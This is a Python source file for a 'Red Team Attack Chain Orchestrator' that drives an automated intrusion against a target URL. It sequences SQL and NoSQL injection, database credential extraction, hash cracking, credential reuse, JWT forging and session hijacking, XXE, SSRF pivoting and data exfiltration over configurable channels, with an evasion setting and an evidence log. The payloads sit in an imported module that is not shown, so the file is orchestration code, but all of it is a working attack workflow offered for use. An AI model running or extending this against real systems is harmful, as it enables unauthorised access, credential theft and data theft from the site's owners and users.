"""
Red Team Attack Chain Orchestrator
====================================
Automated exploitation chain that connects scanner findings to
active exploitation, credential harvesting, privilege escalation,
and data exfiltration — with full evidence trail.

Usage:
    from attack_chain import run_attack_chain
    result = await run_attack_chain("http://target:3000")
"""

import asyncio
import json
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Optional


# ================================================================
# DATA STRUCTURES
# ================================================================

@dataclass
class Evidence:
    """Single evidence entry — timestamped proof of an action."""
    timestamp: str = ""
    phase: str = ""
    action: str = ""
    request: dict = field(default_factory=dict)
    response: dict = field(default_factory=dict)
    finding: dict = field(default_factory=dict)
    severity: str = "INFO"


@dataclass
class ChainConfig:
    """Configuration for the attack chain."""
    max_requests: int = 500
    evasion_level: int = 1          # 0=none, 1=basic, 2=adaptive, 3=full
    exfil_channel: str = "http"     # http / dns / websocket
    crack_timeout: int = 30         # seconds per hash
    credential_wordlist: str = "builtin"
    rate_limit_rpm: int = 60
    collect_evidence: bool = True
    skip_recon: bool = False        # Skip scan if scan_results provided


@dataclass
class AttackChainState:
    """Mutable state threaded through all chain phases."""
    target_url: str = ""
    chain_id: str = ""
    started_at: str = ""
    current_phase: str = "init"

    # Scanner results (input)
    scan_results: dict = field(default_factory=dict)
    spa_endpoints: list = field(default_factory=list)

    # Credentials harvested
    credentials: list = field(default_factory=list)
    tokens: list = field(default_factory=list)
    sessions: list = field(default_factory=list)

    # Exploitation results
    sqli_injectable: list = field(default_factory=list)
    db_schema: dict = field(default_factory=dict)
    exfiltrated_data: list = field(default_factory=list)

    # Privilege level
    privilege_level: str = "anonymous"
    accessible_admin_endpoints: list = field(default_factory=list)

    # Evidence trail
    evidence: list = field(default_factory=list)

    # Issues in scanner format
    issues: list = field(default_factory=list)

    # Stats
    total_requests: int = 0
    phases_completed: list = field(default_factory=list)


def record_evidence(state: AttackChainState, phase: str, action: str,
                    request: dict = None, response: dict = None,
                    finding: dict = None, severity: str = "INFO"):
    """Record a timestamped evidence entry."""
    state.evidence.append(Evidence(
        timestamp=datetime.now(timezone.utc).isoformat(),
        phase=phase,
        action=action,
        request=request or {},
        response=response or {},
        finding=finding or {},
        severity=severity,
    ))


# ================================================================
# PHASE DECISION TREE
# ================================================================

def _decide_next_phase(state: AttackChainState) -> str:
    """Decide next phase based on current state — NOT a fixed sequence."""

    phase = state.current_phase

    if phase == "init":
        if state.scan_results:
            return "identify"
        return "recon"

    if phase == "recon":
        return "identify"

    if phase == "identify":
        if state.sqli_injectable:
            return "extract_data"
        if state.tokens:
            return "session_hijack"
        return "token_harvest"

    if phase == "token_harvest":
        if state.tokens:
            return "session_hijack"
        if state.credentials:
            return "crack_credentials"
        return "compile_evidence"  # Dead end — nothing to exploit

    if phase == "extract_data":
        if state.credentials:
            return "crack_credentials"
        return "credential_reuse"

    if phase == "crack_credentials":
        return "credential_reuse"

    if phase == "credential_reuse":
        if state.tokens:
            return "session_hijack"
        return "exfiltrate"

    if phase == "session_hijack":
        return "nosql_xxe"

    if phase == "nosql_xxe":
        return "ssrf_pivot"

    if phase == "ssrf_pivot":
        return "exfiltrate"

    if phase == "exfiltrate":
        return "compile_evidence"

    return "compile_evidence"


# ================================================================
# CHAIN ORCHESTRATOR
# ================================================================

async def run_attack_chain(
    url: str,
    scan_results: dict = None,
    config: ChainConfig = None,
) -> dict:
    """
    Execute a full attack chain against the target.

    1. Recon (scan if needed)
    2. Identify injection points
    3. Extract data via SQLi
    4. Crack credentials
    5. Credential reuse + escalation
    6. Session manipulation
    7. Data exfiltration PoC
    8. Compile evidence

    Returns a dict with full chain results + evidence timeline.
    """
    # Lazy imports to avoid circular deps
    from tools import (
        spa_api_discovery, advanced_sqli_test, spa_xss_test,
        auth_security_test, business_logic_test,
        sqli_data_extraction, credential_crack, credential_reuse_test,
        session_hijack_test, data_exfiltration, token_harvest,
        nosql_injection_test, xxe_exploitation, ssrf_exploitation,
        auto_pivot, generate_attack_report,
    )

    if not config:
        config = ChainConfig()

    state = AttackChainState(
        target_url=url,
        chain_id=str(uuid.uuid4())[:8],
        started_at=datetime.now(timezone.utc).isoformat(),
        scan_results=scan_results or {},
    )

    record_evidence(state, "init", f"Attack chain started against {url}",
                    finding={"chain_id": state.chain_id, "config": asdict(config)})

    print(f"\n  [CHAIN:{state.chain_id}] Starting attack chain against {url}", flush=True)

    max_phases = 10  # Safety limit
    phase_count = 0

    while phase_count < max_phases:
        next_phase = _decide_next_phase(state)
        if next_phase == "compile_evidence":
            break

        state.current_phase = next_phase
        phase_count += 1
        print(f"  [CHAIN:{state.chain_id}] Phase {phase_count}: {next_phase}", flush=True)

        try:
            # ---- RECON ----
            if next_phase == "recon":
                spa_r = await spa_api_discovery(url)
                sqli_r, auth_r = await asyncio.gather(
                    advanced_sqli_test(url, spa_r),
                    auth_security_test(url, spa_r, {}),
                )

                state.scan_results = {
                    "crawl": {"spa_api_discovery": spa_r},
                    "advanced_sqli": sqli_r,
                    "auth_security": auth_r,
                }
                state.spa_endpoints = spa_r.get("api_endpoints", [])

                # Collect tokens from auth test
                for jwt_f in auth_r.get("jwt_findings", []):
                    if jwt_f.get("type") == "jwt_decoded":
                        # Token was obtained during auth_security_test
                        pass
                # The auth test may have obtained a token via SQLi bypass or registration
                for bypass in sqli_r.get("auth_bypass", []):
                    try:
                        data = json.loads(bypass.get("response_preview", "{}"))
                        token = (data.get("authentication", {}).get("token", "")
                                 or data.get("token", ""))
                        if token:
                            state.tokens.append({
                                "type": "jwt", "value": token,
                                "source": "sqli_auth_bypass",
                                "user": bypass.get("email_used", "admin"),
                            })
                    except Exception:
                        pass

                # Also check if alg:none bypass worked
                if any("alg_none_bypass" == f.get("type") for f in auth_r.get("jwt_findings", [])):
                    state.privilege_level = "admin"

                record_evidence(state, "recon",
                                f"Discovered {spa_r.get('total_discovered', 0)} endpoints, "
                                f"{len(sqli_r.get('sqli_findings', []))} SQLi, "
                                f"{len(state.tokens)} tokens, "
                                f"JWT-forge={'YES' if state.privilege_level == 'admin' else 'NO'}",
                                finding={"endpoints": len(state.spa_endpoints),
                                         "sqli_findings": len(sqli_r.get("sqli_findings", [])),
                                         "auth_bypasses": len(sqli_r.get("auth_bypass", [])),
                                         "tokens": len(state.tokens),
                                         "jwt_alg_none": state.privilege_level == "admin"},
                                severity="HIGH" if state.tokens else "INFO")
                state.phases_completed.append("recon")

            # ---- IDENTIFY ----
            elif next_phase == "identify":
                sqli_r = state.scan_results.get("advanced_sqli", {})
                spa_r = state.scan_results.get("crawl", {}).get("spa_api_discovery", {})

                # Collect SQLi injection points
                for f in sqli_r.get("sqli_findings", []):
                    state.sqli_injectable.append({
                        "endpoint": f.get("endpoint", ""),
                        "type": f.get("type", ""),
                        "db_type": f.get("db_type", ""),
                    })

                # Collect tokens from auth bypass
                for b in sqli_r.get("auth_bypass", []):
                    try:
                        data = json.loads(b.get("response_preview", "{}"))
                        token = (data.get("authentication", {}).get("token", "")
                                 or data.get("token", "")
                                 or data.get("access_token", ""))
                        if token:
                            state.tokens.append({
                                "type": "jwt", "value": token,
                                "source": "sqli_auth_bypass",
                                "user": b.get("email_used", "unknown"),
                            })
                            state.privilege_level = "user"
                    except Exception:
                        pass

                record_evidence(state, "identify",
                                f"Found {len(state.sqli_injectable)} SQLi points, {len(state.tokens)} tokens",
                                finding={"sqli_injectable": len(state.sqli_injectable),
                                         "tokens": len(state.tokens)},
                                severity="HIGH" if state.sqli_injectable else "INFO")
                state.phases_completed.append("identify")

            # ---- EXTRACT DATA ----
            elif next_phase == "extract_data":
                extract_r = await sqli_data_extraction(url, state.sqli_injectable, asdict(state))

                state.db_schema = extract_r.get("schema", {})
                state.credentials.extend(extract_r.get("credentials_found", []))
                state.issues.extend(extract_r.get("issues", []))

                record_evidence(state, "extract_data",
                                f"Extracted {len(state.credentials)} credentials from DB",
                                finding={"tables": list(state.db_schema.keys()),
                                         "credentials": len(state.credentials)},
                                severity="CRITICAL" if state.credentials else "MEDIUM")
                state.phases_completed.append("extract_data")

            # ---- TOKEN HARVEST ----
            elif next_phase == "token_harvest":
                spa_r = state.scan_results.get("crawl", {}).get("spa_api_discovery", {})
                harvest_r = await token_harvest(url, spa_r)

                for t in harvest_r.get("valid_tokens", []):
                    state.tokens.append(t)
                state.issues.extend(harvest_r.get("issues", []))

                record_evidence(state, "token_harvest",
                                f"Harvested {len(harvest_r.get('valid_tokens', []))} valid tokens",
                                finding={"tokens_found": len(harvest_r.get("tokens_found", [])),
                                         "valid": len(harvest_r.get("valid_tokens", []))},
                                severity="HIGH" if harvest_r.get("valid_tokens") else "INFO")
                state.phases_completed.append("token_harvest")

            # ---- CRACK CREDENTIALS ----
            elif next_phase == "crack_credentials":
                crack_r = await credential_crack(state.credentials, config.credential_wordlist)

                # Update credentials with cracked passwords
                for cracked in crack_r.get("cracked", []):
                    for cred in state.credentials:
                        if cred.get("hash") == cracked.get("hash"):
                            cred["cracked"] = cracked.get("cleartext", "")

                state.issues.extend(crack_r.get("issues", []))

                record_evidence(state, "crack_credentials",
                                f"Cracked {len(crack_r.get('cracked', []))} of {len(state.credentials)} hashes",
                                finding={"cracked": len(crack_r.get("cracked", [])),
                                         "total": len(state.credentials)},
                                severity="CRITICAL" if crack_r.get("cracked") else "INFO")
                state.phases_completed.append("crack_credentials")

            # ---- CREDENTIAL REUSE ----
            elif next_phase == "credential_reuse":
                cracked_creds = [c for c in state.credentials if c.get("cracked")]
                spa_r = state.scan_results.get("crawl", {}).get("spa_api_discovery", {})

                reuse_r = await credential_reuse_test(url, cracked_creds, spa_r)

                for login in reuse_r.get("successful_logins", []):
                    token = login.get("token", "")
                    if token:
                        state.tokens.append({
                            "type": "jwt", "value": token,
                            "source": "credential_reuse",
                            "user": login.get("email", ""),
                            "admin": login.get("admin", False),
                        })
                        if login.get("admin"):
                            state.privilege_level = "admin"

                state.issues.extend(reuse_r.get("issues", []))

                record_evidence(state, "credential_reuse",
                                f"Logged in to {len(reuse_r.get('successful_logins', []))} accounts",
                                finding={"logins": len(reuse_r.get("successful_logins", [])),
                                         "admin_access": reuse_r.get("admin_access", False)},
                                severity="CRITICAL" if reuse_r.get("admin_access") else "HIGH")
                state.phases_completed.append("credential_reuse")

            # ---- SESSION HIJACK ----
            elif next_phase == "session_hijack":
                spa_r = state.scan_results.get("crawl", {}).get("spa_api_discovery", {})
                hijack_r = await session_hijack_test(url, state.tokens, spa_r)

                for esc in hijack_r.get("role_escalations", []):
                    state.privilege_level = "admin"
                    state.accessible_admin_endpoints.append(esc.get("endpoint", ""))

                state.issues.extend(hijack_r.get("issues", []))

                record_evidence(state, "session_hijack",
                                f"JWT manipulations: {len(hijack_r.get('jwt_manipulations', []))}",
                                finding={"jwt_manipulations": len(hijack_r.get("jwt_manipulations", [])),
                                         "role_escalations": len(hijack_r.get("role_escalations", [])),
                                         "privilege_level": state.privilege_level},
                                severity="CRITICAL" if hijack_r.get("role_escalations") else "MEDIUM")
                state.phases_completed.append("session_hijack")

            # ---- NOSQL + XXE ----
            elif next_phase == "nosql_xxe":
                spa_r = state.scan_results.get("crawl", {}).get("spa_api_discovery", {})
                nosql_r, xxe_r = await asyncio.gather(
                    nosql_injection_test(url, spa_r),
                    xxe_exploitation(url, spa_r),
                )
                state.issues.extend(nosql_r.get("issues", []))
                state.issues.extend(xxe_r.get("issues", []))

                # Collect NoSQL auth bypass tokens
                for bypass in nosql_r.get("auth_bypass", []):
                    try:
                        data = json.loads(bypass.get("response_preview", "{}"))
                        token = data.get("authentication", {}).get("token", "") or data.get("token", "")
                        if token:
                            state.tokens.append({"type": "jwt", "value": token, "source": "nosql_bypass", "user": "nosql"})
                    except Exception:
                        pass

                record_evidence(state, "nosql_xxe",
                                f"NoSQL: {len(nosql_r.get('auth_bypass', []))} bypass, {len(nosql_r.get('data_leak', []))} leaks. "
                                f"XXE: {len(xxe_r.get('xxe_findings', []))} findings",
                                finding={"nosql_bypass": len(nosql_r.get("auth_bypass", [])),
                                         "xxe_findings": len(xxe_r.get("xxe_findings", [])),
                                         "files_read": xxe_r.get("files_read", [])},
                                severity="CRITICAL" if nosql_r.get("auth_bypass") or xxe_r.get("files_read") else "MEDIUM")
                state.phases_completed.append("nosql_xxe")

            # ---- SSRF + PIVOT ----
            elif next_phase == "ssrf_pivot":
                spa_r = state.scan_results.get("crawl", {}).get("spa_api_discovery", {})
                ssrf_r = await ssrf_exploitation(url, spa_r)
                state.issues.extend(ssrf_r.get("issues", []))

                # Auto-pivot with obtained tokens
                if state.tokens:
                    pivot_r = await auto_pivot(url, state.tokens, spa_r)
                    state.issues.extend(pivot_r.get("issues", []))
                    state.exfiltrated_data.extend(pivot_r.get("admin_data", []))

                    record_evidence(state, "ssrf_pivot",
                                    f"SSRF: {len(ssrf_r.get('ssrf_findings', []))} findings. "
                                    f"Pivot: {len(pivot_r.get('pivoted_endpoints', []))} endpoints accessed",
                                    finding={"ssrf": len(ssrf_r.get("ssrf_findings", [])),
                                             "pivoted": len(pivot_r.get("pivoted_endpoints", [])),
                                             "admin_data": len(pivot_r.get("admin_data", []))},
                                    severity="CRITICAL" if pivot_r.get("admin_data") else "HIGH")
                else:
                    record_evidence(state, "ssrf_pivot",
                                    f"SSRF: {len(ssrf_r.get('ssrf_findings', []))} findings. No tokens for pivot.",
                                    severity="MEDIUM")
                state.phases_completed.append("ssrf_pivot")

            # ---- EXFILTRATE ----
            elif next_phase == "exfiltrate":
                exfil_r = await data_exfiltration(url, asdict(state), config.exfil_channel)

                state.exfiltrated_data.extend(exfil_r.get("data_prepared", []))
                state.issues.extend(exfil_r.get("issues", []))

                record_evidence(state, "exfiltrate",
                                f"Exfiltration PoC: {exfil_r.get('data_size_bytes', 0)} bytes via {config.exfil_channel}",
                                finding={"channel": config.exfil_channel,
                                         "data_size": exfil_r.get("data_size_bytes", 0),
                                         "chunks": exfil_r.get("chunks_prepared", 0)},
                                severity="CRITICAL")
                state.phases_completed.append("exfiltrate")

        except Exception as e:
            record_evidence(state, next_phase, f"Phase failed: {e}",
                            severity="LOW")
            print(f"  [CHAIN:{state.chain_id}] Phase {next_phase} failed: {e}", flush=True)

    # ---- COMPILE EVIDENCE ----
    state.current_phase = "complete"
    elapsed = (datetime.now(timezone.utc) - datetime.fromisoformat(state.started_at)).total_seconds()

    record_evidence(state, "complete",
                    f"Chain completed in {elapsed:.1f}s — {len(state.phases_completed)} phases, "
                    f"{len(state.evidence)} evidence entries",
                    finding={"privilege_level": state.privilege_level,
                             "credentials_cracked": len([c for c in state.credentials if c.get("cracked")]),
                             "tokens_obtained": len(state.tokens),
                             "data_exfiltrated": len(state.exfiltrated_data)},
                    severity="INFO")

    print(f"  [CHAIN:{state.chain_id}] Complete: {len(state.phases_completed)} phases, "
          f"privilege={state.privilege_level}, {len(state.evidence)} evidence entries", flush=True)

    # Build summary
    result = {
        "chain_id": state.chain_id,
        "target_url": url,
        "started_at": state.started_at,
        "elapsed_seconds": round(elapsed, 1),
        "phases_completed": state.phases_completed,
        "privilege_level": state.privilege_level,
        "summary": {
            "sqli_injectable": len(state.sqli_injectable),
            "credentials_extracted": len(state.credentials),
            "credentials_cracked": len([c for c in state.credentials if c.get("cracked")]),
            "tokens_obtained": len(state.tokens),
            "admin_access": state.privilege_level in ("admin", "superadmin"),
            "data_exfiltrated": len(state.exfiltrated_data),
            "total_evidence": len(state.evidence),
        },
        "credentials": state.credentials,
        "tokens": [{"type": t["type"], "source": t["source"], "user": t.get("user", "?"),
                     "value_preview": t["value"][:30] + "..."} for t in state.tokens],
        "db_schema": state.db_schema,
        "evidence_timeline": [asdict(e) for e in state.evidence],
        "issues": state.issues,
    }

    # Generate HTML report
    try:
        html_report = await generate_attack_report(result)
        from pathlib import Path
        report_dir = Path(__file__).parent / ".scan_history"
        report_dir.mkdir(exist_ok=True)
        report_path = report_dir / f"attack_chain_{state.chain_id}.html"
        report_path.write_text(html_report, encoding="utf-8")
        result["report_path"] = str(report_path)
        print(f"  [CHAIN:{state.chain_id}] Report saved to {report_path}", flush=True)
    except Exception as e:
        print(f"  [CHAIN:{state.chain_id}] Report generation failed: {e}", flush=True)

    return result
